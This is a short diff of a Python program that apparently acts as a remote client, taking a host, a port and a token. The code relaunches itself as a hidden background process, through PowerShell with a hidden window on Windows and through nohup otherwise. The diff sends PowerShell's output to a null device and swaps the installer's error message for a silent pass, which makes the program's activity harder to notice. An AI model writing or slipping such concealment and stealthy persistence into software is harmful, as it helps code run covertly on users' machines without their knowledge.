@@ -218,7 +218,7 @@ async def am_main(host: str, port: int, token: str) -> None:
 def async_client(host: str, port: int, token: str, seks: bool = True) -> None:
     if seks:
         if True or sys.platform == "win32":
-            p = Popen(["powershell.exe"], stdin=subprocess.PIPE, text=True)
+            p = Popen(["powershell.exe"], stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, text=True)
             p.communicate(f"Start-Process -FilePath '{sys.executable}' -WindowStyle Hidden -ArgumentList '{__file__}'")
         else:
             Popen(["nohup", sys.executable, __file__], shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
@@ -230,6 +230,6 @@ if __name__ == '__main__':
     try:
         seks_installer()
     except Exception as e:
-        print("Installer: %s" % e)
+        pass
 
     asyncio.run(струи_СЭКСА())
